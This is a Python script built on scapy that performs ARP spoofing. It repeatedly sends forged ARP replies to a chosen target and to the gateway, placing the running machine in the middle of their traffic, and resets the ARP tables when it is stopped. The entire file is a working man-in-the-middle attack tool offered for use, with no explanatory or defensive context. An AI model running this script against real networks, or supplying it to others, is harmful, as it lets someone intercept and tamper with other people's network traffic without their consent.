#!/usr/bin/env python

from click import argument
import scapy.all as scapy
import time
import sys
import optparse

def setup():
    parser = optparse.OptionParser()
    parser.add_option("--t", "--target", dest="target_ip", help="IP of the target")
    parser.add_option("--g", "--gateway", dest="gateway_ip", help="IP of the internet gateway")
    return parser.parse_args(), parser

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if len(answered_list) == 0:
        print("MAC address not found")
        sys.exit()
    return (answered_list[0][1].hwsrc)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


(options, arguments), parser = setup()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

if not target_ip:
    print("[-] Paramenter --target is required. Use --help for more info.")
    sys.exit()
if not gateway_ip:
    print("[-] Paramenter --gateway is required. Use --help for more info.")
    sys.exit()

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count+= 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Quitting due to interrupt. Resetting ARP tables, please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Network back to default settings.")